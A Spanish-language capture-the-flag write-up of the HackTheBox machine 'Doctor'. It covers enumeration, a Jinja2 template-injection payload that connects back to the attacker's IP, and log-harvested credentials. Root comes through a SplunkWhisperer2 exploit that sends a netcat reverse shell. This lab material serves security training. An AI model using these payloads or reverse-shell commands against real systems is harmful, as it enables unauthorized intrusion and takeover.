---
layout: post
title: HTB_Doctor
date: 2023/07/10
slug: HTB_Doctor
heroImage: /assets/machines.jpg
---

# Doctor {-}

## Introduccion {-}

La maquina del dia se llama Doctor.

El replay del live se puede ver aqui

[![S4vitaar Doctor maquina](https://img.youtube.com/vi/kaHpsn1HLp4/0.jpg)](https://www.youtube.com/watch?v=kaHpsn1HLp4)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.209
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.209
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.209 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,80,8089 10.10.10.209 -oN targeted
```


| Puerto | Servicio      | Que se nos occure? | Que falta?           |
| ------ | ------------- | ------------------ | -------------------- |
| 22     | ssh           | Conneccion directa | usuario y contraseña |
| 80     | http          | Web, Fuzzing       |                      |
| 8089   | https splunkd | Web, Fuzzing       |                      |



### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.209
```

Es un Apache 2.4.41 en un Ubuntu. Vemos un email 
```bash
 info@doctors.htb 
```
 Podria ser un usuario y un dominio. Añadimos el dominio al 
```bash
 /etc/hosts 
```


#### Checkear la web {-}

Si entramos en la url 
```bash
 http://10.10.10.209 
```
, vemos una pagina de un cabinete de doctor. Navigamos un poco en la web pero no hay nada interesante.
Si entramos en la web por el dominio 
```bash
 http://doctors.htb 
```
 vemos una nueva pagina. Se esta aplicando virtual hosting. Esta pagina es un login.
El wappalizer nos dice que es un Flask en python.

Aqui de seguida pensamos en un **Template Injection**.

De primeras creamos un nuevo usuario en el panel de registro. 
Vemos que nuestra cuenta a sido creada con un limite de tiempo de 20 minutos. Nos loggeamos y vemos un boton con un numero 1.
Si pinchamos, vemos en la url 
```bash
 http://doctors.htb/home?page=1 
```
. Miramos si se puede aplicar un LFI

```bash
http://doctors.htb/home/page=/etc/passwd
http://doctors.htb/home/page=../../../../../../../../etc/passwd
http://doctors.htb/home/page=../../../../../../../../etc/passwd%00
http://doctors.htb/home/page=../../../../../../../../etc/passwd?
```

Aqui no vemos nada.

Hay un link en la pagina para redactar un nuevo mensaje.

```bash
Title: EEEEEEEEE
Content: Hola
```

Aqui vemos que el mensaje esta visible en la pagina.

> [ ! ] NOTAS: Tito nos habla de probar un RFI (Remote File Inclusion) que seria algo que probar pero nos adelanta que no funcciona en este caso.

Aqui miramos de Injectar etiquetas HTML y XSS pero no funcciona.
## Vulnerability Assessment {-}

### Server Side Template Injection {-}


```bash
Title: {{9*9}}
Content: {{2*3}}
```

Vemos que en esta parte no nos lo interpreta. Si miramos el codigo fuente, vemos que hay un link que esta en la url 
```bash
 http://doctors.htb/archive 
```
 y que esta
en beta testing.

Si vamos a la url en question, hay una pagina blanca pero si otra vez, miramos el codigo fuente, en este caso de la pagina 
```bash
 /archive 
```
, podemos ver que hay 
un numero **81**. Quiere decir que en el directorio **archive** esta interpretando el **SSTI** de los mensajes.

El caso del SSTI nos permite injectar comandos a nivel de systema usando el systema de templating. Si vamos a la carpeta **Server Side Template Injection** de
la pagina de [payloadallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) podemos copiar la Injeccion
de Jinja2 **Exploit the SSTI by calling Popen without guessing the offset**





## Vuln exploit & Gaining Access {-}

### Ganando accesso con SSTI {-}

1. Nos ponemos en escucha por el puerto 443
1. Creamos un nuevo mensaje con el payload

    ```bash
    Title: {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.7\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
    Content: TEST
    ```

1. Recargamos la url 
```bash
 http://doctors.htb/archive 
```


Boom... estamos en la maquina victima.

```bash
whoami
#Output
web

hostname -I
```

Somos web y estamos en la maquina victima. Hacemos el tratamiento de la TTY.

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

### Userpivoting {-}

```bash
cd /home
grep "$sh" /etc/passwd
cd /root
id
```

Aqui podemos ver que hay usuarios splunk y shaun y que estamos en el grupo 
```bash
 adm 
```
. Podriamos visualisar los logs

```bash
cd /var/log
grep -r -i "pass"
grep -r -i "pass" 2>/dev/null
```

Vemos en el **apache2/backup** que hay una peticion POST para resetear una contraseña 
```bash
 Guitar123 
```


```bash
su shaun
Password: Guitar123

cat /home/shaun/user.txt
```
## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
id
sudo -l
cd /
ls -l
cd /opt
```

Aqui vemos un directory splunkforward. Nos hace pensar que teniamos un puerto 8089 abierto con un splunkd.
Si vamos a esta url 
```bash
 https://10.10.10.209:8089 
```
 vemos un servicio splunkd.

Aqui podemos tirar de un exploit en el github de [cnotin](https://github.com/cnotin/SplunkWhisperer2) que permite hacer un
Local o un Remote privilege escalation. En este caso utilizaremos el Remoto.

```bash
git clone https://github.com/cnotin/SplunkWhisperer2
cd SplunkWhisperer2
ls
python3 PySplunkWhisperer2_remote.py
```

aqui vemos como se utiliza. Intentamos primeramente enviar una traza ICMP a nuestra maquina para ver si funcciona.

1. Nos ponemos en escucha por traza ICMP

    ```bash
    tcpdump -i tun0 icmp -n
    ```

1. lanzamos el exploit para enviar una traza ICMP

    ```bash
    python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.7 --username shaun --password Guitar123 --payload "ping -c 1 10.10.14.7"
    ```

Vemos que recibimos la traza. Ahora nos mandamos una reverse shell

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. lanzamos el exploit para entablar una reverse shell

    ```bash
    python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.7 --username shaun --password Guitar123 --payload "nc.traditional -e /bin/bash 10.10.14.7 443"
    ```

La conneccion esta entablada.

```bash
whoami
#Output
root
```
